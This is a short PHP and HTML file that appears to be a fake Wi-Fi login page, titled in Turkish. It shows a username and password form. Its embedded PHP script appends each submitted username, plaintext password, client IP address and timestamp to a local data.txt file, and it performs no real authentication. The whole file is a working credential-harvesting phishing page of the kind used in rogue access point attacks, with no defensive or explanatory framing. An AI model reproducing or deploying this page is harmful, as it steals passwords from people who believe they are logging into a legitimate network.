<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Wifi giriş yap</title>
</head>
<body bgcolor="#808080">
<form method="post">
	
	Kullanıcı Adı: <input type="text" name="kullanici_adi" title="Kullanıcı ad giriniz" required=""> <br>
	Şifre: <input type="password" name="kullanici_sifre" title="Şifre giriniz" required=""> <br>
	<button value="input">Giriş Yap</button>


</form>


<?php 
date_default_timezone_set('Europe/Istanbul');
$ac = fopen("data.txt",a);
$tarih = date('d-m-Y H:i:s',time());
$bosluk = "\n";
$kadi = htmlspecialchars($_POST['kullanici_adi']);
$pass = htmlspecialchars($_POST['kullanici_sifre']);
$al = " KULLANICI ADI > ".$kadi." SİFRE > ".$pass." Ip adresi: ".$_SERVER['REMOTE_ADDR']." İslem Tarihi > ".$tarih.$bosluk;
$yaz = fwrite($ac,$al);
fclose($ac);
 ?>

</body>
</html>
